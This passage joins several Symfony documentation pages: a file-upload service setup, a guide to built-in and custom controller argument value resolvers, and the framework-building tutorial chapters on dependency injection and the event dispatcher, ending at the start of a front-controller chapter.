Then, define a service for this class:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Service\FileUploader:
                arguments:
                    $targetDirectory: '%brochures_directory%'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">
            <!-- ... -->

            <service id="App\Service\FileUploader">
                <argument>%brochures_directory%</argument>
            </service>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\FileUploader;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(FileUploader::class)
                ->arg('$targetDirectory', '%brochures_directory%')
            ;
        };

Now you're ready to use this service in the controller::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Service\FileUploader;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    // ...
    public function new(Request $request, FileUploader $fileUploader): Response
    {
        // ...

        if ($form->isSubmitted() && $form->isValid()) {
            /** @var UploadedFile $brochureFile */
            $brochureFile = $form->get('brochure')->getData();
            if ($brochureFile) {
                $brochureFileName = $fileUploader->upload($brochureFile);
                $product->setBrochureFilename($brochureFileName);
            }

            // ...
        }

        // ...
    }

Using a Doctrine Listener
-------------------------

The previous versions of this article explained how to handle file uploads using
:ref:`Doctrine listeners <doctrine-lifecycle-listener>`. However, this is no longer
recommended, because Doctrine events shouldn't be used for your domain logic.

Moreover, Doctrine listeners are often dependent on internal Doctrine behavior
which may change in future versions. Also, they can introduce performance issues
unwillingly (because your listener persists entities which cause other entities to
be changed and persisted).

As an alternative, you can use :doc:`Symfony events, listeners and subscribers </event_dispatcher>`.

.. _`VichUploaderBundle`: https://github.com/dustin10/VichUploaderBundle
Extending Action Argument Resolving
===================================

In the :doc:`controller guide </controller>`, you've learned that you can get the
:class:`Symfony\\Component\\HttpFoundation\\Request` object via an argument in
your controller. This argument has to be type-hinted by the ``Request`` class
in order to be recognized. This is done via the
:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver`. By
creating and registering custom value resolvers, you can extend this
functionality.

.. _functionality-shipped-with-the-httpkernel:

Built-In Value Resolvers
------------------------

Symfony ships with the following value resolvers in the
:doc:`HttpKernel component </components/http_kernel>`:

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\BackedEnumValueResolver`
    Attempts to resolve a backed enum case from a route path parameter that matches the name of the argument.
    Leads to a 404 Not Found response if the value isn't a valid backing value for the enum type.

    For example, if your backed enum is::

        namespace App\Model;

        enum Suit: string
        {
            case Hearts = 'H';
            case Diamonds = 'D';
            case Clubs = 'C';
            case Spades = 'S';
        }

    And your controller contains the following::

        class CardController
        {
            #[Route('/cards/{suit}')]
            public function list(Suit $suit): Response
            {
                // ...
            }

            // ...
        }

    When requesting the ``/cards/H`` URL, the ``$suit`` variable will store the
    ``Suit::Hearts`` case.

    Furthermore, you can limit route parameter's allowed values to
    only one (or more) with ``EnumRequirement``::

        use Symfony\Component\Routing\Requirement\EnumRequirement;

        // ...

        class CardController
        {
            #[Route('/cards/{suit}', requirements: [
                // this allows all values defined in the Enum
                'suit' => new EnumRequirement(Suit::class),
                // this restricts the possible values to the Enum values listed here
                'suit' => new EnumRequirement([Suit::Diamonds, Suit::Spades]),
            ])]
            public function list(Suit $suit): Response
            {
                // ...
            }

            // ...
        }

    The example above allows requesting only ``/cards/D`` and ``/cards/S``
    URLs and leads to 404 Not Found response in two other cases.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\RequestPayloadValueResolver`
    Maps the request payload or the query string into the type-hinted object.

    Because this is a :ref:`targeted value resolver <value-resolver-targeted>`,
    you'll have to use either the :ref:`MapRequestPayload <controller-mapping-request-payload>`
    or the :ref:`MapQueryString <controller-mapping-query-string>` attribute
    in order to use this resolver.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\RequestAttributeValueResolver`
    Attempts to find a request attribute that matches the name of the argument.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\DateTimeValueResolver`
    Attempts to find a request attribute that matches the name of the argument
    and injects a ``DateTimeInterface`` object if type-hinted with a class
    extending ``DateTimeInterface``.

    By default any input that can be parsed as a date string by PHP is accepted.
    You can restrict how the input can be formatted with the
    :class:`Symfony\\Component\\HttpKernel\\Attribute\\MapDateTime` attribute.

    .. tip::

        The ``DateTimeInterface`` object is generated with the :doc:`Clock component </components/clock>`.
        This. gives your full control over the date and time values the controller
        receives when testing your application and using the
        :class:`Symfony\\Component\\Clock\\MockClock` implementation.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\RequestValueResolver`
    Injects the current ``Request`` if type-hinted with ``Request`` or a class
    extending ``Request``.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\ServiceValueResolver`
    Injects a service if type-hinted with a valid service class or interface. This
    works like :doc:`autowiring </service_container/autowiring>`.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\SessionValueResolver`
    Injects the configured session class implementing ``SessionInterface`` if
    type-hinted with ``SessionInterface`` or a class implementing
    ``SessionInterface``.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\DefaultValueResolver`
    Will set the default value of the argument if present and the argument
    is optional.

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\UidValueResolver`
    Attempts to convert any UID values from a route path parameter into UID objects.
    Leads to a 404 Not Found response if the value isn't a valid UID.

    For example, the following will convert the token parameter into a ``UuidV4`` object::

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;
        use Symfony\Component\Uid\UuidV4;

        class DefaultController
        {
            #[Route('/share/{token}')]
            public function share(UuidV4 $token): Response
            {
                // ...
            }
        }

:class:`Symfony\\Component\\HttpKernel\\Controller\\ArgumentResolver\\VariadicValueResolver`
    Verifies if the request data is an array and will add all of them to the
    argument list. When the action is called, the last (variadic) argument will
    contain all the values of this array.

In addition, some components, bridges and official bundles provide other value resolvers:

:class:`Symfony\\Component\\Security\\Http\\Controller\\UserValueResolver`
    Injects the object that represents the current logged in user if type-hinted
    with ``UserInterface``. You can also type-hint your own ``User`` class but you
    must then add the ``#[CurrentUser]`` attribute to the argument. Default value
    can be set to ``null`` in case  the controller can be accessed by anonymous
    users. It requires installing the :doc:`SecurityBundle </security>`.

    If the argument is not nullable and there is no logged in user or the logged in
    user has a user class not matching the type-hinted class, an ``AccessDeniedException``
    is thrown by the resolver to prevent access to the controller.

:class:`Symfony\\Component\\Security\\Http\\Controller\\SecurityTokenValueResolver`
    Injects the object that represents the current logged in token if type-hinted
    with ``TokenInterface`` or a class extending it.

    If the argument is not nullable and there is no logged in token, an ``HttpException``
    with status code 401 is thrown by the resolver to prevent access to the controller.

:class:`Symfony\\Bridge\\Doctrine\\ArgumentResolver\\EntityValueResolver`
    Automatically query for an entity and pass it as an argument to your controller.

    For example, the following will query the ``Product`` entity which has ``{id}`` as primary key::

        // src/Controller/DefaultController.php
        namespace App\Controller;

        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class DefaultController
        {
            #[Route('/product/{id}')]
            public function share(Product $product): Response
            {
                // ...
            }
        }

    To learn more about the use of the ``EntityValueResolver``, see the dedicated
    section :ref:`Automatically Fetching Objects <doctrine-entity-value-resolver>`.

PSR-7 Objects Resolver:
    Injects a Symfony HttpFoundation ``Request`` object created from a PSR-7 object
    of type ``Psr\Http\Message\ServerRequestInterface``,
    ``Psr\Http\Message\RequestInterface`` or ``Psr\Http\Message\MessageInterface``.
    It requires installing :doc:`the PSR-7 Bridge </components/psr7>` component.

Managing Value Resolvers
------------------------

For each argument, every resolver tagged with ``controller.argument_value_resolver``
will be called until one provides a value. The order in which they are called depends
on their priority. For example, the ``SessionValueResolver`` will be called before the
``DefaultValueResolver`` because its priority is higher. This allows to write e.g.
``SessionInterface $session = null`` to get the session if there is one, or ``null``
if there is none.

In that specific case, you don't need any resolver running before
``SessionValueResolver``, so skipping them would not only improve performance,
but also prevent one of them providing a value before ``SessionValueResolver``
has a chance to.

The :class:`Symfony\\Component\\HttpKernel\\Attribute\\ValueResolver` attribute
lets you do this by "targeting" the resolver you want::

    // src/Controller/SessionController.php
    namespace App\Controller;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpFoundation\Session\SessionInterface;
    use Symfony\Component\HttpKernel\Attribute\ValueResolver;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolver\SessionValueResolver;
    use Symfony\Component\Routing\Attribute\Route;

    class SessionController
    {
        #[Route('/')]
        public function __invoke(
            #[ValueResolver(SessionValueResolver::class)]
            SessionInterface $session = null
        ): Response
        {
            // ...
        }
    }

In the example above, the ``SessionValueResolver`` will be called first because
it is targeted. The ``DefaultValueResolver`` will be called next if no value has
been provided; that's why you can assign ``null`` as ``$session``'s default value.

You can target a resolver by passing its name as ``ValueResolver``'s first argument.
For convenience, built-in resolvers' name are their FQCN.

A targeted resolver can also be disabled by passing ``ValueResolver``'s ``$disabled``
argument to ``true``; this is how :ref:`MapEntity allows to disable the
EntityValueResolver for a specific controller <doctrine-entity-value-resolver>`.
Yes, ``MapEntity`` extends ``ValueResolver``!

Adding a Custom Value Resolver
------------------------------

In the next example, you'll create a value resolver to inject an ID value
object whenever a controller argument has a type implementing
``IdentifierInterface`` (e.g. ``BookingId``)::

    // src/Controller/BookingController.php
    namespace App\Controller;

    use App\Reservation\BookingId;
    use Symfony\Component\HttpFoundation\Response;

    class BookingController
    {
        public function index(BookingId $id): Response
        {
            // ... do something with $id
        }
    }

Adding a new value resolver requires creating a class that implements
:class:`Symfony\\Component\\HttpKernel\\Controller\\ValueResolverInterface`
and defining a service for it.

This interface contains a ``resolve()`` method, which is called for each
argument of the controller. It receives the current ``Request`` object and an
:class:`Symfony\\Component\\HttpKernel\\ControllerMetadata\\ArgumentMetadata`
instance, which contains all information from the method signature.

The ``resolve()`` method should return either an empty array (if it cannot resolve
this argument) or an array with the resolved value(s). Usually arguments are
resolved as a single value, but variadic arguments require resolving multiple
values. That's why you must always return an array, even for single values::

    // src/ValueResolver/IdentifierValueResolver.php
    namespace App\ValueResolver;

    use App\IdentifierInterface;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpKernel\Controller\ValueResolverInterface;
    use Symfony\Component\HttpKernel\ControllerMetadata\ArgumentMetadata;

    class BookingIdValueResolver implements ValueResolverInterface
    {
        public function resolve(Request $request, ArgumentMetadata $argument): iterable
        {
            // get the argument type (e.g. BookingId)
            $argumentType = $argument->getType();
            if (
                !$argumentType
                || !is_subclass_of($argumentType, IdentifierInterface::class, true)
            ) {
                return [];
            }

            // get the value from the request, based on the argument name
            $value = $request->attributes->get($argument->getName());
            if (!is_string($value)) {
                return [];
            }

            // create and return the value object
            return [$argumentType::fromString($value)];
        }
    }

This method first checks whether it can resolve the value:

* The argument must be type-hinted with a class implementing a custom ``IdentifierInterface``;
* The argument name (e.g. ``$id``) must match the name of a request
  attribute (e.g. using a ``/booking/{id}`` route placeholder).

When those requirements are met, the method creates a new instance of the
custom value object and returns it as the value for this argument.

That's it! Now all you have to do is add the configuration for the service
container. This can be done by adding one of the following tags to your value resolver.

``controller.argument_value_resolver``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This tag is automatically added to every service implementing ``ValueResolverInterface``,
but you can set it yourself to change its ``priority`` or ``name`` attributes.

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            _defaults:
                # ... be sure autowiring is enabled
                autowire: true
            # ...

            App\ValueResolver\BookingIdValueResolver:
                tags:
                    - controller.argument_value_resolver:
                        name: booking_id
                        priority: 150

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-Instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... be sure autowiring is enabled -->
                <defaults autowire="true"/>
                <!-- ... -->

                <service id="App\ValueResolver\BookingIdValueResolver">
                    <tag name="booking_id" priority="150">controller.argument_value_resolver</tag>
                </service>
            </services>

        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\ValueResolver\BookingIdValueResolver;

        return static function (ContainerConfigurator $containerConfigurator): void {
            $services = $containerConfigurator->services();

            $services->set(BookingIdValueResolver::class)
                ->tag('controller.argument_value_resolver', ['name' => 'booking_id', 'priority' => 150])
            ;
        };

While adding a priority is optional, it's recommended to add one to make sure
the expected value is injected. The built-in ``RequestAttributeValueResolver``,
which fetches attributes from the ``Request``, has a priority of ``100``. If your
resolver also fetches ``Request`` attributes, set a priority of ``100`` or more.
Otherwise, set a priority lower than ``100`` to make sure the argument resolver
is not triggered when the ``Request`` attribute is present.

To ensure your resolvers are added in the right position you can run the following
command to see which argument resolvers are present and in which order they run:

.. code-block:: terminal

    $ php bin/console debug:container debug.argument_resolver.inner --show-arguments

You can also configure the name passed to the ``ValueResolver`` attribute to target
your resolver. Otherwise it will default to the service's id.

.. _value-resolver-targeted:

``controller.targeted_value_resolver``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Set this tag if you want your resolver to be called only if it is targeted by a
``ValueResolver`` attribute. Like ``controller.argument_value_resolver``, you
can customize the name by which your resolver can be targeted.

As an alternative, you can add the
:class:`Symfony\\Component\\HttpKernel\\Attribute\\AsTargetedValueResolver` attribute
to your resolver and pass your custom name as its first argument::

    // src/ValueResolver/IdentifierValueResolver.php
    namespace App\ValueResolver;

    use Symfony\Component\HttpKernel\Attribute\AsTargetedValueResolver;
    use Symfony\Component\HttpKernel\Controller\ValueResolverInterface;

    #[AsTargetedValueResolver('booking_id')]
    class BookingIdValueResolver implements ValueResolverInterface
    {
        // ...
    }

You can then pass this name as ``ValueResolver``'s first argument to target your resolver::

    // src/Controller/BookingController.php
    namespace App\Controller;

    use App\Reservation\BookingId;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Attribute\ValueResolver;

    class BookingController
    {
        public function index(#[ValueResolver('booking_id')] BookingId $id): Response
        {
            // ... do something with $id
        }
    }
The DependencyInjection Component
=================================

In the previous chapter, we emptied the ``Simplex\Framework`` class by
extending the ``HttpKernel`` class from the eponymous component. Seeing this
empty class, you might be tempted to move some code from the front controller
to it::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    use Symfony\Component\EventDispatcher\EventDispatcher;
    use Symfony\Component\HttpFoundation;
    use Symfony\Component\HttpFoundation\RequestStack;
    use Symfony\Component\HttpKernel;
    use Symfony\Component\Routing;

    class Framework extends HttpKernel\HttpKernel
    {
        public function __construct($routes)
        {
            $context = new Routing\RequestContext();
            $matcher = new Routing\Matcher\UrlMatcher($routes, $context);
            $requestStack = new RequestStack();

            $controllerResolver = new HttpKernel\Controller\ControllerResolver();
            $argumentResolver = new HttpKernel\Controller\ArgumentResolver();

            $dispatcher = new EventDispatcher();
            $dispatcher->addSubscriber(new HttpKernel\EventListener\ErrorListener(
                'Calendar\Controller\ErrorController::exception'
            ));
            $dispatcher->addSubscriber(new HttpKernel\EventListener\RouterListener($matcher, $requestStack));
            $dispatcher->addSubscriber(new HttpKernel\EventListener\ResponseListener('UTF-8'));
            $dispatcher->addSubscriber(new StringResponseListener());

            parent::__construct($dispatcher, $controllerResolver, $requestStack, $argumentResolver);
        }
    }

The front controller code would become more concise::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;

    $request = Request::createFromGlobals();
    $routes = include __DIR__.'/../src/app.php';

    $framework = new Simplex\Framework($routes);

    $framework->handle($request)->send();

Having a concise front controller allows you to have several front controllers
for a single application. Why would it be useful? To allow having different
configuration for the development environment and the production one for
instance. In the development environment, you might want to have error
reporting turned on and errors displayed in the browser to ease debugging::

    ini_set('display_errors', 1);
    error_reporting(-1);

... but you certainly won't want that same configuration on the production
environment. Having two different front controllers gives you the opportunity
to have a slightly different configuration for each of them.

So, moving code from the front controller to the framework class makes our
framework more configurable, but at the same time, it introduces a lot of
issues:

* We are not able to register custom listeners anymore as the dispatcher is
  not available outside the Framework class (a workaround could be the
  adding of a ``Framework::getEventDispatcher()`` method);

* We have lost the flexibility we had before; you cannot change the
  implementation of the ``UrlMatcher`` or of the ``ControllerResolver``
  anymore;

* Related to the previous point, we cannot test our framework without much
  effort anymore as it's impossible to mock internal objects;

* We cannot change the charset passed to ``ResponseListener`` anymore (a
  workaround could be to pass it as a constructor argument).

The previous code did not exhibit the same issues because we used dependency
injection; all dependencies of our objects were injected into their
constructors (for instance, the event dispatchers were injected into the
framework so that we had total control of its creation and configuration).

Does it mean that we have to make a choice between flexibility, customization,
ease of testing and not to copy and paste the same code into each application
front controller? As you might expect, there is a solution. We can solve all
these issues and some more by using the Symfony dependency injection
container:

.. code-block:: terminal

    $ composer require symfony/dependency-injection

Create a new file to host the dependency injection container configuration::

    // example.com/src/container.php
    use Simplex\Framework;
    use Symfony\Component\DependencyInjection;
    use Symfony\Component\DependencyInjection\Reference;
    use Symfony\Component\EventDispatcher;
    use Symfony\Component\HttpFoundation;
    use Symfony\Component\HttpKernel;
    use Symfony\Component\Routing;

    $container = new DependencyInjection\ContainerBuilder();
    $container->register('context', Routing\RequestContext::class);
    $container->register('matcher', Routing\Matcher\UrlMatcher::class)
        ->setArguments([$routes, new Reference('context')])
    ;
    $container->register('request_stack', HttpFoundation\RequestStack::class);
    $container->register('controller_resolver', HttpKernel\Controller\ControllerResolver::class);
    $container->register('argument_resolver', HttpKernel\Controller\ArgumentResolver::class);

    $container->register('listener.router', HttpKernel\EventListener\RouterListener::class)
        ->setArguments([new Reference('matcher'), new Reference('request_stack')])
    ;
    $container->register('listener.response', HttpKernel\EventListener\ResponseListener::class)
        ->setArguments(['UTF-8'])
    ;
    $container->register('listener.exception', HttpKernel\EventListener\ErrorListener::class)
        ->setArguments(['Calendar\Controller\ErrorController::exception'])
    ;
    $container->register('dispatcher', EventDispatcher\EventDispatcher::class)
        ->addMethodCall('addSubscriber', [new Reference('listener.router')])
        ->addMethodCall('addSubscriber', [new Reference('listener.response')])
        ->addMethodCall('addSubscriber', [new Reference('listener.exception')])
    ;
    $container->register('framework', Framework::class)
        ->setArguments([
            new Reference('dispatcher'),
            new Reference('controller_resolver'),
            new Reference('request_stack'),
            new Reference('argument_resolver'),
        ])
    ;

    return $container;

The goal of this file is to configure your objects and their dependencies.
Nothing is instantiated during this configuration step. This is purely a
static description of the objects you need to manipulate and how to create
them. Objects will be created on-demand when you access them from the
container or when the container needs them to create other objects.

For instance, to create the router listener, we tell Symfony that its class
name is ``Symfony\Component\HttpKernel\EventListener\RouterListener`` and
that its constructor takes a matcher object (``new Reference('matcher')``). As
you can see, each object is referenced by a name, a string that uniquely
identifies each object. The name allows us to get an object and to reference
it in other object definitions.

.. note::

    By default, every time you get an object from the container, it returns
    the exact same instance. That's because a container manages your "global"
    objects.

The front controller is now only about wiring everything together::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;

    $routes = include __DIR__.'/../src/app.php';
    $container = include __DIR__.'/../src/container.php';

    $request = Request::createFromGlobals();

    $response = $container->get('framework')->handle($request);

    $response->send();

As all the objects are now created in the dependency injection container, the
framework code should be the previous simple version::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    use Symfony\Component\HttpKernel\HttpKernel;

    class Framework extends HttpKernel
    {
    }

.. note::

    If you want a light alternative for your container, consider `Pimple`_, a
    simple dependency injection container in about 60 lines of PHP code.

Now, here is how you can register a custom listener in the front controller::

    // ...
    use Simplex\StringResponseListener;

    $container->register('listener.string_response', StringResponseListener::class);
    $container->getDefinition('dispatcher')
        ->addMethodCall('addSubscriber', [new Reference('listener.string_response')])
    ;

Besides describing your objects, the dependency injection container can also be
configured via parameters. Let's create one that defines if we are in debug
mode or not::

    $container->setParameter('debug', true);

    echo $container->getParameter('debug');

These parameters can be used when defining object definitions. Let's make the
charset configurable::

    // ...
    $container->register('listener.response', HttpKernel\EventListener\ResponseListener::class)
        ->setArguments(['%charset%'])
    ;

After this change, you must set the charset before using the response listener
object::

    $container->setParameter('charset', 'UTF-8');

Instead of relying on the convention that the routes are defined by the
``$routes`` variables, let's use a parameter again::

    // ...
    $container->register('matcher', Routing\Matcher\UrlMatcher::class)
        ->setArguments(['%routes%', new Reference('context')])
    ;

And the related change in the front controller::

    $container->setParameter('routes', include __DIR__.'/../src/app.php');

We have barely scratched the surface of what you can do with the
container: from class names as parameters, to overriding existing object
definitions, from shared service support to dumping a container to a plain PHP class,
and much more. The Symfony dependency injection container is really powerful
and is able to manage any kind of PHP class.

Don't yell at me if you don't want to use a dependency injection container in
your framework. If you don't like it, don't use it. It's your framework, not
mine.

This is (already) the last chapter of this book on creating a framework on top
of the Symfony components. I'm aware that many topics have not been covered
in great details, but hopefully it gives you enough information to get started
on your own and to better understand how the Symfony framework works
internally.

Have fun!

.. _`Pimple`: https://github.com/silexphp/Pimple
The EventDispatcher Component
=============================

Our framework is still missing a major characteristic of any good framework:
*extensibility*. Being extensible means that the developer should be able to
hook into the framework life cycle to modify the way the request is handled.

What kind of hooks are we talking about? Authentication or caching for
instance. To be flexible, hooks must be plug-and-play; the ones you "register"
for an application are different from the next one depending on your specific
needs. Many software have a similar concept like Drupal or WordPress. In some
languages, there is even a standard like `WSGI`_ in Python or `Rack`_ in Ruby.

As there is no standard for PHP, we are going to use a well-known design
pattern, the *Mediator*, to allow any kind of behaviors to be attached to our
framework; the Symfony EventDispatcher Component implements a lightweight
version of this pattern:

.. code-block:: terminal

    $ composer require symfony/event-dispatcher

How does it work? The *dispatcher*, the central object of the event dispatcher
system, notifies *listeners* of an *event* dispatched to it. Put another way:
your code dispatches an event to the dispatcher, the dispatcher notifies all
registered listeners for the event, and each listener does whatever it wants
with the event.

As an example, let's create a listener that transparently adds the Google
Analytics code to all responses.

To make it work, the framework must dispatch an event just before returning
the Response instance::

    // example.com/src/Simplex/Framework.php
    namespace Simplex;

    use Symfony\Component\EventDispatcher\EventDispatcher;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Controller\ArgumentResolverInterface;
    use Symfony\Component\HttpKernel\Controller\ControllerResolverInterface;
    use Symfony\Component\Routing\Exception\ResourceNotFoundException;
    use Symfony\Component\Routing\Matcher\UrlMatcherInterface;

    class Framework
    {
        public function __construct(
            private EventDispatcher $dispatcher,
            private UrlMatcherInterface $matcher,
            private ControllerResolverInterface $controllerResolver,
            private ArgumentResolverInterface $argumentResolver,
        ) {
        }

        public function handle(Request $request): Response
        {
            $this->matcher->getContext()->fromRequest($request);

            try {
                $request->attributes->add($this->matcher->match($request->getPathInfo()));

                $controller = $this->controllerResolver->getController($request);
                $arguments = $this->argumentResolver->getArguments($request, $controller);

                $response = call_user_func_array($controller, $arguments);
            } catch (ResourceNotFoundException $exception) {
                $response = new Response('Not Found', 404);
            } catch (\Exception $exception) {
                $response = new Response('An error occurred', 500);
            }

            // dispatch a response event
            $this->dispatcher->dispatch(new ResponseEvent($response, $request), 'response');

            return $response;
        }
    }

Each time the framework handles a Request, a ``ResponseEvent`` event is
now dispatched::

    // example.com/src/Simplex/ResponseEvent.php
    namespace Simplex;

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Contracts\EventDispatcher\Event;

    class ResponseEvent extends Event
    {
        public function __construct(
            private Response $response,
            private Request $request,
        ) {
        }

        public function getResponse(): Response
        {
            return $this->response;
        }

        public function getRequest(): Request
        {
            return $this->request;
        }
    }

The last step is the creation of the dispatcher in the front controller and
the registration of a listener for the ``response`` event::

    // example.com/web/front.php
    require_once __DIR__.'/../vendor/autoload.php';

    // ...

    use Symfony\Component\EventDispatcher\EventDispatcher;

    $dispatcher = new EventDispatcher();
    $dispatcher->addListener('response', function (Simplex\ResponseEvent $event): void {
        $response = $event->getResponse();

        if ($response->isRedirection()
            || ($response->headers->has('Content-Type') && false === strpos($response->headers->get('Content-Type'), 'html'))
            || 'html' !== $event->getRequest()->getRequestFormat()
        ) {
            return;
        }

        $response->setContent($response->getContent().'GA CODE');
    });

    $controllerResolver = new ControllerResolver();
    $argumentResolver = new ArgumentResolver();

    $framework = new Simplex\Framework($dispatcher, $matcher, $controllerResolver, $argumentResolver);
    $response = $framework->handle($request);

    $response->send();

.. note::

    The listener is just a proof of concept and you should add the Google
    Analytics code just before the body tag.

As you can see, ``addListener()`` associates a valid PHP callback to a named
event (``response``); the event name must be the same as the one used in the
``dispatch()`` call.

In the listener, we add the Google Analytics code only if the response is not
a redirection, if the requested format is HTML and if the response content
type is HTML (these conditions demonstrate the ease of manipulating the
Request and Response data from your code).

So far so good, but let's add another listener on the same event. Let's say
that we want to set the ``Content-Length`` of the Response if it is not already
set::

    $dispatcher->addListener('response', function (Simplex\ResponseEvent $event): void {
        $response = $event->getResponse();
        $headers = $response->headers;

        if (!$headers->has('Content-Length') && !$headers->has('Transfer-Encoding')) {
            $headers->set('Content-Length', strlen($response->getContent()));
        }
    });

Depending on whether you have added this piece of code before the previous
listener registration or after it, you will have the wrong or the right value
for the ``Content-Length`` header. Sometimes, the order of the listeners
matter but by default, all listeners are registered with the same priority,
``0``. To tell the dispatcher to run a listener early, change the priority to
a positive number; negative numbers can be used for low priority listeners.
Here, we want the ``Content-Length`` listener to be executed last, so change
the priority to ``-255``::

    $dispatcher->addListener('response', function (Simplex\ResponseEvent $event): void {
        $response = $event->getResponse();
        $headers = $response->headers;

        if (!$headers->has('Content-Length') && !$headers->has('Transfer-Encoding')) {
            $headers->set('Content-Length', strlen($response->getContent()));
        }
    }, -255);

.. tip::

    When creating your framework, think about priorities (reserve some numbers
    for internal listeners for instance) and document them thoroughly.

Let's refactor the code a bit by moving the Google listener to its own class::

    // example.com/src/Simplex/GoogleListener.php
    namespace Simplex;

    class GoogleListener
    {
        public function onResponse(ResponseEvent $event): void
        {
            $response = $event->getResponse();

            if ($response->isRedirection()
                || ($response->headers->has('Content-Type') && false === strpos($response->headers->get('Content-Type'), 'html'))
                || 'html' !== $event->getRequest()->getRequestFormat()
            ) {
                return;
            }

            $response->setContent($response->getContent().'GA CODE');
        }
    }

And do the same with the other listener::

    // example.com/src/Simplex/ContentLengthListener.php
    namespace Simplex;

    class ContentLengthListener
    {
        public function onResponse(ResponseEvent $event): void
        {
            $response = $event->getResponse();
            $headers = $response->headers;

            if (!$headers->has('Content-Length') && !$headers->has('Transfer-Encoding')) {
                $headers->set('Content-Length', strlen($response->getContent()));
            }
        }
    }

Our front controller should now look like the following::

    $dispatcher = new EventDispatcher();
    $dispatcher->addListener('response', [new Simplex\ContentLengthListener(), 'onResponse'], -255);
    $dispatcher->addListener('response', [new Simplex\GoogleListener(), 'onResponse']);

Even if the code is now nicely wrapped in classes, there is still a slight
issue: the knowledge of the priorities is "hardcoded" in the front controller,
instead of being in the listeners themselves. For each application, you have
to remember to set the appropriate priorities. Moreover, the listener method
names are also exposed here, which means that refactoring our listeners would
mean changing all the applications that rely on those listeners. The solution
to this dilemma is to use subscribers instead of listeners::

    $dispatcher = new EventDispatcher();
    $dispatcher->addSubscriber(new Simplex\ContentLengthListener());
    $dispatcher->addSubscriber(new Simplex\GoogleListener());

A subscriber knows about all the events it is interested in and pass this
information to the dispatcher via the ``getSubscribedEvents()`` method. Have a
look at the new version of the ``GoogleListener``::

    // example.com/src/Simplex/GoogleListener.php
    namespace Simplex;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;

    class GoogleListener implements EventSubscriberInterface
    {
        // ...

        public static function getSubscribedEvents(): array
        {
            return ['response' => 'onResponse'];
        }
    }

And here is the new version of ``ContentLengthListener``::

    // example.com/src/Simplex/ContentLengthListener.php
    namespace Simplex;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;

    class ContentLengthListener implements EventSubscriberInterface
    {
        // ...

        public static function getSubscribedEvents(): array
        {
            return ['response' => ['onResponse', -255]];
        }
    }

.. tip::

    A single subscriber can host as many listeners as you want on as many
    events as needed.

To make your framework truly flexible, don't hesitate to add more events; and
to make it more awesome out of the box, add more listeners. Again, this book
is not about creating a generic framework, but one that is tailored to your
needs. Stop whenever you see fit, and further evolve the code from there.

.. _`WSGI`: https://www.python.org/dev/peps/pep-0333/#middleware-components-that-play-both-sides
.. _`Rack`: https://github.com/rack/rack
The Front Controller
====================

Up until now, our application is simplistic as there is only one page. To
spice things up a little bit, let's go crazy and add another page that says
goodbye::

    // framework/bye.php
    require_once __DIR__.'/vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();

    $response = new Response('Goodbye!');
    $response->send();

As you can see for yourself, much of the code is exactly the same as the one
we have written for the first page. Let's extract the common code that we can
share between all our pages. Code sharing sounds like a good plan to create
our first "real" framework!

The PHP way of doing the refactoring would probably be the creation of an
include file::

    // framework/init.php
    require_once __DIR__.'/vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();
    $response = new Response();

Let's see it in action::

    // framework/index.php
